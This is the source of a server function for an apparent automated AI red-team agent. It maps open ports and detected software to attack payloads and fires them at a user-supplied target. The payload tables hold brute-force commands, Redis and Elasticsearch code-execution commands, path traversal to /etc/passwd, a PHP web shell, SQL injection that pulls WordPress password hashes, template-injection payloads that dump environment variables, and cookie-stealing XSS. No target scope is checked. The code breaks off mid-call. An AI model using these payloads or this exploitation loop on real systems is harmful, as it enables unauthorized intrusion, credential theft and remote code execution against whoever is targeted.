import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const LOVABLE_API_KEY = Deno.env.get('LOVABLE_API_KEY');
const AI_GATEWAY_URL = 'https://ai.gateway.lovable.dev/v1/chat/completions';
const SUPABASE_URL = Deno.env.get('SUPABASE_URL') ?? '';
const SUPABASE_ANON_KEY = Deno.env.get('SUPABASE_ANON_KEY') ?? '';

interface AgentState {
  phase: 'recon' | 'scanning' | 'exploitation' | 'post-exploit' | 'reporting' | 'learning';
  target: string;
  session_id: string;
  findings: Finding[];
  correlations: Correlation[];
  attack_chains: AttackChain[];
  learning_context: LearningContext;
  iteration: number;
  max_iterations: number;
}

interface Finding {
  id: string;
  type: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  title: string;
  description: string;
  evidence: any;
  timestamp: string;
  phase: string;
  tool_used: string;
  exploitable: boolean;
  correlated_with?: string[];
  confidence?: number;
  verified?: boolean;
  subdomain?: string;
  exploit_confirmed?: boolean;
  poc_data?: string;
  cve_id?: string;
  port?: number;
  service?: string;
}

interface Correlation {
  id: string; findings: string[]; attack_path: string;
  risk_amplification: number; exploitation_probability: number; description: string;
}

interface AttackChain {
  id: string; name: string; steps: AttackStep[];
  success_probability: number; impact: string; mitre_mapping: string[];
}

interface AttackStep {
  order: number; tool: string; action: string;
  target_component: string; expected_outcome: string; dependencies: string[];
}

interface LearningContext {
  successful_techniques: TechniqueRecord[];
  failed_techniques: TechniqueRecord[];
  target_signatures: TargetSignature[];
  adaptation_history: Adaptation[];
  model_confidence: number;
}

interface TechniqueRecord {
  technique: string; target_type: string;
  success_count: number; failure_count: number;
  avg_execution_time: number; last_used: string;
}

interface TargetSignature {
  signature: string; tech_stack: string[];
  common_vulnerabilities: string[]; recommended_approach: string;
}

interface Adaptation {
  trigger: string; original_approach: string;
  adapted_approach: string; outcome: string; timestamp: string;
}

const MITRE_TECHNIQUES = {
  recon: ['T1595', 'T1592', 'T1589', 'T1590', 'T1591'],
  initial_access: ['T1190', 'T1133', 'T1566'],
  execution: ['T1059', 'T1203', 'T1047'],
  persistence: ['T1098', 'T1136', 'T1078'],
  privilege_escalation: ['T1068', 'T1055', 'T1548'],
  defense_evasion: ['T1070', 'T1140', 'T1202'],
  credential_access: ['T1110', 'T1003', 'T1555'],
  discovery: ['T1087', 'T1083', 'T1046'],
  lateral_movement: ['T1021', 'T1534', 'T1550'],
  collection: ['T1005', 'T1039', 'T1114'],
  exfiltration: ['T1041', 'T1567', 'T1048']
};

const PHASE_SCAN_TYPES: Record<string, string[]> = {
  recon:          ['dns', 'headers', 'tech', 'ssl', 'port'],
  scanning:       ['port', 'directory', 'dir-traversal', 'cors-advanced'],
  exploitation:   ['sqli', 'xss', 'lfi', 'ssrf', 'nosql-inject', 'cors-advanced', 'dir-traversal'],
  'post-exploit': ['cookies', 'cookie-hijack', 'csrf', 'jwt-test'],
  learning:       []
};

const VERIFICATION_MAP: Record<string, string> = {
  'sqli':          'sqli-blind',
  'xss':           'headers',
  'lfi':           'dir-traversal',
  'cors-advanced': 'cors-test',
  'dir-traversal': 'directory',
  'cookies':       'cookie-hijack',
  'ssrf':          'headers',
  'nosql-inject':  'sqli',
};

// ===== SERVICE EXPLOIT MAP: Port → Service → Exploit Payloads =====
const SERVICE_EXPLOIT_MAP: Record<number, { service: string; exploits: { type: string; payload: string; cve?: string; description: string }[] }> = {
  21: {
    service: 'FTP',
    exploits: [
      { type: 'anonymous-login', payload: 'USER anonymous\\r\\nPASS anonymous@', description: 'FTP Anonymous Login', cve: 'CVE-1999-0497' },
      { type: 'brute-force', payload: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{target}', description: 'FTP Brute Force' },
    ]
  },
  22: {
    service: 'SSH',
    exploits: [
      { type: 'weak-auth', payload: 'ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no {target}', description: 'SSH Password Auth Check' },
      { type: 'enum-users', payload: 'auxiliary/scanner/ssh/ssh_enumusers', description: 'SSH User Enumeration', cve: 'CVE-2018-15473' },
    ]
  },
  23: {
    service: 'Telnet',
    exploits: [
      { type: 'cleartext', payload: 'telnet {target}', description: 'Telnet Cleartext Protocol (insecure)', cve: 'CVE-2020-10188' },
    ]
  },
  25: {
    service: 'SMTP',
    exploits: [
      { type: 'open-relay', payload: 'EHLO test\\r\\nMAIL FROM:<test@test.com>\\r\\nRCPT TO:<test@external.com>', description: 'SMTP Open Relay Test' },
      { type: 'vrfy', payload: 'VRFY root', description: 'SMTP User Enumeration via VRFY' },
    ]
  },
  53: {
    service: 'DNS',
    exploits: [
      { type: 'zone-transfer', payload: 'dig axfr @{target} {domain}', description: 'DNS Zone Transfer', cve: 'CVE-2021-25216' },
    ]
  },
  80: {
    service: 'HTTP',
    exploits: [
      { type: 'method-enum', payload: 'OPTIONS / HTTP/1.1\\r\\nHost: {target}', description: 'HTTP Method Enumeration' },
      { type: 'traversal', payload: 'GET /..%2f..%2f..%2fetc/passwd HTTP/1.1', description: 'Path Traversal', cve: 'CVE-2021-41773' },
      { type: 'verb-tampering', payload: 'PATCH /admin HTTP/1.1', description: 'HTTP Verb Tampering' },
    ]
  },
  443: {
    service: 'HTTPS',
    exploits: [
      { type: 'heartbleed', payload: 'nmap --script ssl-heartbleed -p 443 {target}', description: 'Heartbleed Test', cve: 'CVE-2014-0160' },
      { type: 'weak-cipher', payload: 'nmap --script ssl-enum-ciphers -p 443 {target}', description: 'Weak SSL Ciphers' },
    ]
  },
  445: {
    service: 'SMB',
    exploits: [
      { type: 'eternal-blue', payload: 'auxiliary/scanner/smb/smb_ms17_010', description: 'EternalBlue Check', cve: 'CVE-2017-0144' },
      { type: 'null-session', payload: 'smbclient -L //{target} -N', description: 'SMB Null Session' },
    ]
  },
  1433: {
    service: 'MSSQL',
    exploits: [
      { type: 'brute-force', payload: 'hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://{target}', description: 'MSSQL Brute Force' },
      { type: 'xp-cmdshell', payload: "EXEC xp_cmdshell 'whoami'", description: 'MSSQL xp_cmdshell RCE', cve: 'CVE-2020-0618' },
    ]
  },
  3306: {
    service: 'MySQL',
    exploits: [
      { type: 'brute-force', payload: 'hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{target}', description: 'MySQL Brute Force' },
      { type: 'auth-bypass', payload: 'mysql -u root --password= -h {target}', description: 'MySQL Empty Password', cve: 'CVE-2012-2122' },
    ]
  },
  3389: {
    service: 'RDP',
    exploits: [
      { type: 'bluekeep', payload: 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep', description: 'BlueKeep Check', cve: 'CVE-2019-0708' },
      { type: 'nla-check', payload: 'nmap --script rdp-enum-encryption -p 3389 {target}', description: 'RDP NLA Check' },
    ]
  },
  5432: {
    service: 'PostgreSQL',
    exploits: [
      { type: 'brute-force', payload: 'hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://{target}', description: 'PostgreSQL Brute Force' },
    ]
  },
  6379: {
    service: 'Redis',
    exploits: [
      { type: 'unauth', payload: 'redis-cli -h {target} INFO', description: 'Redis Unauthenticated Access', cve: 'CVE-2022-0543' },
      { type: 'rce', payload: 'redis-cli -h {target} eval "return io.popen(\\"id\\"):read(\\"*a\\")" 0', description: 'Redis Lua RCE' },
    ]
  },
  8080: {
    service: 'HTTP-Proxy',
    exploits: [
      { type: 'traversal', payload: 'GET /..;/manager/html HTTP/1.1', description: 'Tomcat Manager Bypass', cve: 'CVE-2020-1938' },
      { type: 'default-creds', payload: 'admin:admin', description: 'Default Credentials' },
    ]
  },
  8443: {
    service: 'HTTPS-Alt',
    exploits: [
      { type: 'weak-cipher', payload: 'nmap --script ssl-enum-ciphers -p 8443 {target}', description: 'Weak SSL Ciphers on 8443' },
    ]
  },
  27017: {
    service: 'MongoDB',
    exploits: [
      { type: 'unauth', payload: 'mongosh --host {target} --eval "db.adminCommand({listDatabases:1})"', description: 'MongoDB Unauthenticated', cve: 'CVE-2020-7921' },
    ]
  },
  9200: {
    service: 'Elasticsearch',
    exploits: [
      { type: 'unauth', payload: 'curl http://{target}:9200/_cat/indices', description: 'Elasticsearch Unauthenticated', cve: 'CVE-2015-1427' },
      { type: 'rce', payload: 'curl http://{target}:9200/_search?pretty -d \'{"script_fields":{"myscript":{"script":"java.lang.Runtime.getRuntime().exec(\\"id\\")"}}}\' ', description: 'Elasticsearch RCE' },
    ]
  },
};

// ===== TECH CVE MAP (expanded) =====
const TECH_CVE_MAP: Record<string, { cves: string[]; payloads: { type: string; payload: string }[] }> = {
  'apache': {
    cves: ['CVE-2021-41773', 'CVE-2021-42013', 'CVE-2023-25690', 'CVE-2024-38476'],
    payloads: [
      { type: 'traversal', payload: '/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd' },
      { type: 'traversal', payload: '/icons/.%2e/%2e%2e/%2e%2e/etc/passwd' },
      { type: 'ssrf', payload: '/proxy/unix:/tmp/test|http://127.0.0.1/' },
    ]
  },
  'nginx': {
    cves: ['CVE-2021-23017', 'CVE-2024-7347', 'CVE-2019-20372'],
    payloads: [
      { type: 'traversal', payload: '/..%2f..%2f..%2fetc/passwd' },
      { type: 'ssrf', payload: '/proxy/http://127.0.0.1:80/admin' },
    ]
  },
  'php': {
    cves: ['CVE-2024-4577', 'CVE-2019-11043', 'CVE-2024-2961'],
    payloads: [
      { type: 'cmdi', payload: '<?php system($_GET["cmd"]); ?>' },
      { type: 'lfi', payload: 'php://filter/convert.base64-encode/resource=index.php' },
      { type: 'cmdi', payload: '-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' },
    ]
  },
  'wordpress': {
    cves: ['CVE-2023-2982', 'CVE-2024-27956', 'CVE-2024-2876', 'CVE-2022-21661'],
    payloads: [
      { type: 'sqli', payload: "' UNION SELECT 1,user_login,user_pass,4 FROM wp_users--" },
      { type: 'xss', payload: '<img src=x onerror=alert(document.domain)>' },
      { type: 'sqli', payload: "wp-admin/admin-ajax.php?action=parse-media-shortcode&shortcode=[gallery%20ids=\"1 UNION SELECT 1,2,user_pass FROM wp_users--\"]" },
    ]
  },
  'node': {
    cves: ['CVE-2023-32002', 'CVE-2024-22019', 'CVE-2022-32213'],
    payloads: [
      { type: 'ssti', payload: '{{constructor.constructor("return this.process.env")()}}' },
      { type: 'ssrf', payload: 'http://[::1]:3000/admin' },
      { type: 'traversal', payload: '/..%00/etc/passwd' },
    ]
  },
  'express': {
    cves: ['CVE-2024-29041', 'CVE-2022-24999'],
    payloads: [
      { type: 'traversal', payload: '..\\\\..\\\\..\\\\..\\\\etc\\\\passwd' },
      { type: 'xss', payload: '"><img/src=x onerror=alert(1)>' },
      { type: 'ssrf', payload: '//evil.com' },
    ]
  },
  'tomcat': {
    cves: ['CVE-2020-1938', 'CVE-2024-50379', 'CVE-2024-21733'],
    payloads: [
      { type: 'traversal', payload: '/..;/manager/html' },
      { type: 'traversal', payload: '/%252e%252e/%252e%252e/etc/passwd' },
    ]
  },
  'spring': {
    cves: ['CVE-2022-22965', 'CVE-2022-22963', 'CVE-2024-22234'],
    payloads: [
      { type: 'ssti', payload: '${T(java.lang.Runtime).getRuntime().exec("id")}' },
      { type: 'cmdi', payload: 'class.module.classLoader.URLs%5B0%5D=0' },
    ]
  },
  'iis': {
    cves: ['CVE-2021-31166', 'CVE-2017-7269'],
    payloads: [
      { type: 'traversal', payload: '/..%255c..%255c..%255cwindows/win.ini' },
      { type: 'xss', payload: '/%3Cscript%3Ealert(1)%3C/script%3E.aspx' },
    ]
  },
  'jquery': {
    cves: ['CVE-2020-11023', 'CVE-2019-11358'],
    payloads: [
      { type: 'xss', payload: '<option><style></option></select><img src=x onerror=alert(1)>' },
    ]
  },
  'openssl': { cves: ['CVE-2022-3602', 'CVE-2024-0727'], payloads: [] },
  'django': {
    cves: ['CVE-2024-27351', 'CVE-2023-36053'],
    payloads: [
      { type: 'sqli', payload: "1' OR '1'='1" },
      { type: 'ssti', payload: '{{request.META}}' },
    ]
  },
  'flask': {
    cves: ['CVE-2023-30861'],
    payloads: [
      { type: 'ssti', payload: '{{config.items()}}' },
      { type: 'ssti', payload: "{{''.__class__.__mro__[1].__subclasses__()}}" },
    ]
  },
  'laravel': {
    cves: ['CVE-2021-3129'],
    payloads: [
      { type: 'rce', payload: '_ignition/execute-solution' },
      { type: 'xss', payload: '<img src=x onerror=alert(document.cookie)>' },
    ]
  },
  'redis': {
    cves: ['CVE-2022-0543', 'CVE-2023-28856'],
    payloads: [
      { type: 'cmdi', payload: 'eval "return io.popen(\\"id\\"):read(\\"*a\\")" 0' },
    ]
  },
  'joomla': {
    cves: ['CVE-2023-23752', 'CVE-2024-21726'],
    payloads: [
      { type: 'sqli', payload: '/api/index.php/v1/config/application?public=true' },
    ]
  },
  'drupal': {
    cves: ['CVE-2018-7600', 'CVE-2019-6340'],
    payloads: [
      { type: 'rce', payload: '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' },
    ]
  },
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { action, data } = await req.json();
    
    const authHeader = req.headers.get('Authorization');
    if (!authHeader?.startsWith('Bearer ')) {
      return new Response(JSON.stringify({ error: 'Authentication required' }), {
        status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } }
    });
    
    const { data: userData, error: userError } = await supabase.auth.getUser();
    if (userError || !userData?.user) {
      return new Response(JSON.stringify({ error: 'Invalid or expired token' }), {
        status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }
    const userId = userData.user.id;
    console.log(`[Continuous Red Team Agent] User: ${userId} - Action: ${action}`);

    switch (action) {
      case 'start-continuous-operation': {
        const { target, objective, max_iterations = 100, config } = data;
        
        const sessionId = crypto.randomUUID();
        const agentState: AgentState = {
          phase: 'recon',
          target,
          session_id: sessionId,
          findings: [],
          correlations: [],
          attack_chains: [],
          learning_context: await loadLearningContext(supabase, userId, target),
          iteration: 0,
          max_iterations
        };

        const result = await executeContinuousOperation(agentState, objective, config, authHeader, supabase, userId);

        await supabase.from('attack_chains').insert({
          user_id: userId,
          target,
          chain_name: `Continuous Op - ${new Date().toISOString()}`,
          attack_sequence: result.attack_chains,
          status: 'completed',
          results: {
            findings: result.findings,
            correlations: result.correlations,
            learning_updates: result.learning_updates
          }
        });

        return new Response(JSON.stringify({
          success: true,
          session_id: sessionId,
          ...result,
          persisted: true
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      case 'run-phase': {
        const { target, phase } = data;
        const phaseResult = await executePhase(phase, target, authHeader);
        
        try {
          await supabase.from('ai_learnings').insert({
            user_id: userId,
            tool_used: `red-team-${phase}`,
            target,
            findings: phaseResult.findings || [],
            success: (phaseResult.findings?.length || 0) > 0,
            execution_time: phaseResult.execution_time || 0,
            ai_analysis: `Phase ${phase}: ${phaseResult.findings?.length || 0} findings from ${phaseResult.scans_completed || 0} scans`,
            improvement_strategy: phaseResult.findings?.length > 0
              ? `${phase} effective - found ${phaseResult.findings.map((f: any) => f.type).join(', ')}`
              : `${phase} yielded no findings - consider expanding scan scope or adjusting parameters`
          });
        } catch (e) {
          console.warn('[AI Learning] Failed to record:', e);
        }
        
        return new Response(JSON.stringify({ success: true, phase, ...phaseResult }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      case 'exploit-ports': {
        // New action: Pentest discovered ports/services
        const { target, ports } = data;
        const exploitResult = await exploitOpenPorts(target, ports || [], authHeader);
        
        // Record learning
        try {
          await supabase.from('ai_learnings').insert({
            user_id: userId,
            tool_used: 'port-service-exploit',
            target,
            findings: exploitResult.findings,
            success: exploitResult.findings.length > 0,
            execution_time: exploitResult.execution_time,
            ai_analysis: `Port exploitation: tested ${exploitResult.ports_tested} ports, ${exploitResult.findings.length} confirmed vulnerabilities`,
            improvement_strategy: exploitResult.findings.length > 0
              ? `Service exploitation successful on ports: ${exploitResult.findings.map((f: any) => f.port).join(', ')}`
              : 'No service vulnerabilities confirmed - try deeper exploitation with specific service versions'
          });
        } catch (e) { console.warn('[AI Learning] Record failed:', e); }
        
        return new Response(JSON.stringify({ success: true, ...exploitResult }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      case 'confirm-cves': {
        // New action: Confirm CVEs with actual exploit attempts
        const { target, cves, techStack } = data;
        const confirmResult = await confirmCVEsWithExploit(target, cves || [], techStack || [], authHeader);
        
        try {
          await supabase.from('ai_learnings').insert({
            user_id: userId,
            tool_used: 'cve-exploit-confirmation',
            target,
            findings: confirmResult.findings,
            success: confirmResult.confirmed > 0,
            execution_time: confirmResult.execution_time,
            ai_analysis: `CVE confirmation: ${confirmResult.confirmed}/${confirmResult.total_tested} CVEs exploited successfully`,
            improvement_strategy: confirmResult.confirmed > 0
              ? `Confirmed CVEs: ${confirmResult.findings.filter((f: any) => f.exploit_confirmed).map((f: any) => f.cve_id).join(', ')}`
              : 'No CVEs exploitable on target - may be patched or WAF-protected'
          });
        } catch (e) { console.warn('[AI Learning] Record failed:', e); }
        
        return new Response(JSON.stringify({ success: true, ...confirmResult }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      case 'ai-false-positive-filter': {
        // AI evaluates whether findings are real or false positives
        const { findings: rawFindings, target: filterTarget } = data;
        const filtered = await aiFalsePositiveFilter(rawFindings || [], filterTarget, supabase, userId);
        
        return new Response(JSON.stringify({ success: true, ...filtered }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      case 'correlate-findings': {
        const { findings, target_context } = data;
        const correlations = await correlateFindings(findings, target_context);
        const attackChains = await generateAttackChains(correlations, target_context);
        return new Response(JSON.stringify({
          success: true, correlations, attack_chains: attackChains,
          risk_score: calculateRiskScore(correlations)
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      case 'adaptive-learning': {
        const { execution_result, technique, target_type, context } = data;
        const learningUpdate = await processLearning(execution_result, technique, target_type, context);
        await supabase.from('ai_learnings').insert({
          user_id: userId, tool_used: technique, target: target_type,
          findings: execution_result.findings || [], success: execution_result.success,
          execution_time: execution_result.execution_time,
          ai_analysis: learningUpdate.analysis, improvement_strategy: learningUpdate.adaptation_strategy
        });
        return new Response(JSON.stringify({
          success: true, learning: learningUpdate,
          next_recommended_action: learningUpdate.next_action,
          model_confidence: learningUpdate.confidence
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      case 'get-agent-recommendations': {
        const { target, current_phase, existing_findings } = data;
        const { data: learnings } = await supabase
          .from('ai_learnings').select('*').eq('user_id', userId)
          .order('created_at', { ascending: false }).limit(50);
        const recommendations = await generateAgentRecommendations(
          target, current_phase, existing_findings, learnings || []
        );
        return new Response(JSON.stringify({
          success: true, recommendations,
          confidence_score: recommendations.confidence,
          mitre_mapping: recommendations.mitre_techniques
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      case 'fine-tune-model': {
        const { training_data, model_type } = data;
        const fineTuningResult = await fineTuneAgentModel(training_data, model_type);
        return new Response(JSON.stringify({ success: true, ...fineTuningResult }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      default:
        return new Response(JSON.stringify({ error: 'Unknown action' }), {
          status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
    }
  } catch (error) {
    console.error('[Continuous Red Team Agent Error]', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    });
  }
});

// ===== Security Scan Integration =====

async function callSecurityScan(scanType: string, target: string, authHeader: string): Promise<any> {
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 25000);
    const response = await fetch(`${SUPABASE_URL}/functions/v1/security-scan`, {
      method: 'POST',
      headers: {
        'Authorization': authHeader, 'Content-Type': 'application/json', 'apikey': SUPABASE_ANON_KEY,
      },
      body: JSON.stringify({ scanType, target, options: {} }),
      signal: controller.signal,
    });
    clearTimeout(timeout);
    if (!response.ok) {
      const errorText = await response.text();
      console.warn(`[security-scan ${scanType}] ${response.status}: ${errorText}`);
      return { success: false, error: errorText, scanType, target };
    }
    return await response.json();
  } catch (error) {
    if (error.name === 'AbortError') {
      return { success: false, error: 'Scan timed out', scanType, target };
    }
    return { success: false, error: error.message, scanType, target };
  }
}

// ===== Deduplication Engine =====
function deduplicateFindings(findings: Finding[]): Finding[] {
  const seen = new Map<string, Finding>();
  for (const f of findings) {
    const normTitle = f.title.replace(/^\[[^\]]+\]\s*/, '').toLowerCase().trim();
    const key = `${f.type}|${normTitle}|${f.severity}`;
    const existing = seen.get(key);
    if (!existing) {
      seen.set(key, f);
    } else {
      // Keep the one with higher confidence, exploit_confirmed, or verified
      if ((f.exploit_confirmed && !existing.exploit_confirmed) ||
          (f.verified && !existing.verified) ||
          (f.confidence || 0) > (existing.confidence || 0)) {
        seen.set(key, f);
      }
    }
  }
  return Array.from(seen.values());
}

// ===== PORT SERVICE EXPLOITATION =====
async function exploitOpenPorts(
  target: string, ports: number[], authHeader: string
): Promise<{ findings: Finding[]; output: string[]; ports_tested: number; execution_time: number }> {
  const startTime = Date.now();
  const output: string[] = [];
  const findings: Finding[] = [];

  // If no ports provided, run port scan first
  if (ports.length === 0) {
    output.push('[PORT-EXPLOIT] No ports provided, running port scan...');
    const portScan = await callSecurityScan('port', target, authHeader);
    if (portScan.success !== false) {
      const portFindings = extractFindings(portScan, 'port', 'exploitation', target);
      for (const f of portFindings) {
        const portMatch = f.title.match(/(\d+)/);
        if (portMatch) ports.push(parseInt(portMatch[1]));
      }
    }
    // Common ports fallback
    if (ports.length === 0) ports = [21, 22, 80, 443, 3306, 8080];
  }

  output.push(`[PORT-EXPLOIT] Testing ${ports.length} ports: ${ports.join(', ')}`);

  for (const port of ports) {
    const serviceInfo = SERVICE_EXPLOIT_MAP[port];
    if (!serviceInfo) {
      output.push(`[PORT-EXPLOIT] Port ${port}: No exploit templates, running generic scan`);
      // Run generic service scan
      const result = await callSecurityScan('port', `${target}:${port}`, authHeader);
      if (result.success !== false) {
        const genericFindings = extractFindings(result, 'port', 'exploitation', target);
        genericFindings.forEach(f => { f.port = port; });
        findings.push(...genericFindings);
      }
      continue;
    }

    output.push(`[PORT-EXPLOIT] Port ${port} (${serviceInfo.service}): Testing ${serviceInfo.exploits.length} exploits...`);

    for (const exploit of serviceInfo.exploits) {
      try {
        // Use security-scan to test the exploit
        const scanType = exploit.type.includes('brute') ? 'brute-force' :
                         exploit.type.includes('traversal') ? 'dir-traversal' :
                         exploit.type.includes('xss') ? 'xss' :
                         exploit.type.includes('sqli') ? 'sqli' : 'port';
        
        const testTarget = port === 80 || port === 443 ? target : `${target}:${port}`;
        const result = await callSecurityScan(scanType, testTarget, authHeader);
        
        if (result.success !== false) {
          const exploitFindings = extractFindings(result, scanType, 'exploitation', target);
          
          if (exploitFindings.length > 0) {
            // Exploit confirmed!
            for (const ef of exploitFindings) {
              ef.exploit_confirmed = true;
              ef.poc_data = `Service: ${serviceInfo.service} on port ${port}\\nExploit: ${exploit.description}\\nPayload: ${exploit.payload.replace('{target}', target)}`;
              ef.cve_id = exploit.cve;
              ef.port = port;
              ef.service = serviceInfo.service;
              ef.confidence = 0.95;
              ef.verified = true;
            }
            findings.push(...exploitFindings);
            output.push(`[PORT-EXPLOIT] ✅ Port ${port} ${serviceInfo.service}: ${exploit.description} → CONFIRMED${exploit.cve ? ` (${exploit.cve})` : ''}`);
          } else {
            output.push(`[PORT-EXPLOIT] ❌ Port ${port} ${serviceInfo.service}: ${exploit.description} → Not vulnerable`);
          }
        }
      } catch (e) {
        output.push(`[PORT-EXPLOIT] ⚠️ Port ${port} ${exploit.type}: Error - ${e.message}`);
      }
    }
  }

  return {
    findings: deduplicateFindings(findings),
    output,
    ports_tested: ports.length,
    execution_time: Date.now() - startTime,
  };
}

// ===== CVE CONFIRMATION VIA EXPLOITATION =====
async function confirmCVEsWithExploit(
  target: string, cveList: string[], techStack: string[], authHeader: string
): Promise<{ findings: Finding[]; output: string[]; confirmed: number; total_tested: number; execution_time: number }> {
  const startTime = Date.now();
  const output: string[] = [];
  const findings: Finding[] = [];
  let confirmed = 0;

  // Build CVE → payload mapping from tech stack
  const cvePayloadMap: { cve: string; payloads: { type: string; payload: string }[]; tech: string }[] = [];
  
  for (const tech of techStack) {
    const techLower = tech.toLowerCase();
    for (const [key, mapping] of Object.entries(TECH_CVE_MAP)) {
      if (techLower.includes(key)) {
        for (const cve of mapping.cves) {
          if (cveList.length === 0 || cveList.includes(cve)) {
            cvePayloadMap.push({ cve, payloads: mapping.payloads, tech: key });
          }
        }
      }
    }
  }

  // If no specific CVEs provided, test all CVEs for detected tech
  if (cveList.length === 0) {
    for (const [key, mapping] of Object.entries(TECH_CVE_MAP)) {
      if (techStack.some(t => t.toLowerCase().includes(key))) {
        for (const cve of mapping.cves) {
          if (!cvePayloadMap.some(c => c.cve === cve)) {
            cvePayloadMap.push({ cve, payloads: mapping.payloads, tech: key });
          }
        }
      }
    }
  }

  output.push(`[CVE-EXPLOIT] Testing ${cvePayloadMap.length} CVEs against ${target}...`);

  for (const cveEntry of cvePayloadMap) {
    if (cveEntry.payloads.length === 0) {
      output.push(`[CVE-EXPLOIT] ${cveEntry.cve}: No exploit payload available (${cveEntry.tech})`);
      continue;
    }

    output.push(`[CVE-EXPLOIT] Testing ${cveEntry.cve} (${cveEntry.tech})...`);
    let cveConfirmed = false;

    for (const payload of cveEntry.payloads) {
      try {
        // Fire the exploit via attack-execution-loop with NO retry limit for CVE confirmation
        const response = await fetch(`${SUPABASE_URL}/functions/v1/attack-execution-loop`, {
          method: 'POST',
          headers: {
            'Authorization': authHeader, 'Content-Type': 'application/json', 'apikey': SUPABASE_ANON_KEY,
          },
          body: JSON.stringify({
            target,
            payloads: [{
              raw: payload.payload,
              encoded: encodeURIComponent(payload.payload),
              attackType: payload.type,
              parameter: 'q',
              injectionPoint: 'query',
            }],
            maxRetries: 5, // Increased from 3 to 5 for CVE confirmation
            techStack,
          }),
        });

        if (response.ok) {
          const result = await response.json();
          if (result.successCount > 0) {
            cveConfirmed = true;
            confirmed++;
            const pocPayload = result.results?.[0]?.successPayload || payload.payload;
            findings.push({
              id: crypto.randomUUID(),
              type: payload.type,
              severity: 'critical',
              title: `${cveEntry.cve} - ${cveEntry.tech.toUpperCase()} Exploitation Confirmed`,
              description: `CVE ${cveEntry.cve} confirmed exploitable via ${payload.type} attack on ${cveEntry.tech}. Exploit payload successfully bypassed defenses.`,
              evidence: { 
                raw: { poc: pocPayload, cve: cveEntry.cve, tech: cveEntry.tech, exploit_type: payload.type },
                attack_result: result
              },
              timestamp: new Date().toISOString(),
              phase: 'cve-exploitation',
              tool_used: 'cve-exploit',
              exploitable: true,
              exploit_confirmed: true,
              poc_data: `CVE: ${cveEntry.cve}\\nTech: ${cveEntry.tech}\\nPayload: ${pocPayload}\\nResult: Exploitation successful`,
              cve_id: cveEntry.cve,
              confidence: 0.98,
              verified: true,
            });
            output.push(`[CVE-EXPLOIT] ✅ ${cveEntry.cve} → EXPLOITED! PoC generated (${payload.type})`);
            break; // One confirmed payload is enough
          }
        }
      } catch (e) {
        output.push(`[CVE-EXPLOIT] ⚠️ ${cveEntry.cve}/${payload.type}: ${e.message}`);
      }
    }

    if (!cveConfirmed) {
      output.push(`[CVE-EXPLOIT] ❌ ${cveEntry.cve}: Not exploitable (patched or WAF-protected)`);
      // Record as false positive learning
      findings.push({
        id: crypto.randomUUID(),
        type: 'cve-not-exploitable',
        severity: 'info',
        title: `${cveEntry.cve} - Not Exploitable`,
        description: `CVE ${cveEntry.cve} (${cveEntry.tech}) was detected but could not be exploited. Target may be patched.`,
        evidence: { cve: cveEntry.cve, tech: cveEntry.tech, tested_payloads: cveEntry.payloads.length },
        timestamp: new Date().toISOString(),
        phase: 'cve-exploitation',
        tool_used: 'cve-exploit',
        exploitable: false,
        exploit_confirmed: false,
        cve_id: cveEntry.cve,
        confidence: 0.2,
        verified: false,
      });
    }
  }

  return {
    findings: deduplicateFindings(findings),
    output,
    confirmed,
    total_tested: cvePayloadMap.length,
    execution_time: Date.now() - startTime,
  };
}

// ===== AI FALSE POSITIVE FILTER =====
async function aiFalsePositiveFilter(
  findings: Finding[], target: string, supabase: any, userId: string
): Promise<{ filtered: Finding[]; removed: Finding[]; output: string[] }> {
  const output: string[] = [];
  
  if (!LOVABLE_API_KEY || findings.length === 0) {
    return { filtered: findings, removed: [], output: ['[FP-FILTER] No AI key or no findings to filter'] };
  }

  // Load historical false positive patterns
  const { data: historicalLearnings } = await supabase
    .from('ai_learnings')
    .select('*')
    .eq('user_id', userId)
    .eq('success', false)
    .order('created_at', { ascending: false })
    .limit(50);

  const fpPatterns = (historicalLearnings || [])
    .filter((l: any) => l.improvement_strategy?.includes('false positive') || l.improvement_strategy?.includes('yielded no findings'))
    .map((l: any) => l.tool_used)
    .slice(0, 20);

  try {
    const response = await fetch(AI_GATEWAY_URL, {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${LOVABLE_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: 'google/gemini-2.5-flash',
        messages: [
